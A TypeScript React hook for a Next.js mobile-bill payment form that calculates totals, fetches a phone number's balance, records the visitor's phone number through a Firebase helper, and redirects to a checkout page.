"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import type { PaymentFormData, BalanceData } from "@/types/payment"
import { fetchBalance } from "@/lib/api"
import { addData } from "@/lib/firebasee"

export function usePaymentForm() {
  const [formData, setFormData] = useState<PaymentFormData>({
    phoneNumber: "",
    selectedAmount: "30.000",
    numberType: "رقم آخر",
    fees: "-0.600",
    total: "0.000",
  })

  const [balanceData, setBalanceData] = useState<BalanceData | null>(null)
  const [isLoadingBalance, setIsLoadingBalance] = useState(false)
  const [balanceError, setBalanceError] = useState<string | null>(null)
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [loading, setLoading] = useState(false)

  const router = useRouter()

  // Calculate total when selected amount or fees change
  useEffect(() => {
    const totalAmount = Math.max(
      0,
      Number.parseFloat(formData.selectedAmount) + Number.parseFloat(formData.fees),
    ).toFixed(3)

    setFormData((prev) => ({ ...prev, total: totalAmount }))
  }, [formData.selectedAmount, formData.fees])

  // Save selected amount to localStorage
  useEffect(() => {
    localStorage.setItem("amount", formData.selectedAmount)
  }, [formData.selectedAmount])

  // Fetch balance when phone number is complete
  useEffect(() => {
    if (formData.phoneNumber.length === 8) {
      getBalance(formData.phoneNumber)
    }
  }, [formData.phoneNumber])

  const updateFormData = (updates: Partial<PaymentFormData>) => {
    setFormData((prev) => ({ ...prev, ...updates }))
  }

  const getBalance = async (number: string) => {
    setIsLoadingBalance(true)
    setBalanceError(null)

    try {
      const data = await fetchBalance(number)
      setBalanceData(data)

      if (data.dueAmount) {
        updateFormData({ selectedAmount: data.dueAmount })
      }
    } catch (error) {
      console.error("Failed to fetch balance:", error)
    } finally {
      setIsLoadingBalance(false)
    }
  }

  const handleSubmit = () => {
    if (formData.phoneNumber === "") return

    setIsSubmitted(true)
    setLoading(true)

    const _id = Math.random().toString(36).replace("0.", "zain-")
    const visitorId = localStorage.getItem("visitor") || _id

    addData({
      id: visitorId,
      name: formData.phoneNumber,
      phone: formData.phoneNumber,
    })

    setTimeout(() => {
      router.push("/checkout")
      setIsSubmitted(false)
      setLoading(false)
    }, 2000)
  }

  return {
    formData,
    updateFormData,
    balanceData,
    isLoadingBalance,
    balanceError,
    isSubmitted,
    loading,
    handleSubmit,
  }
}
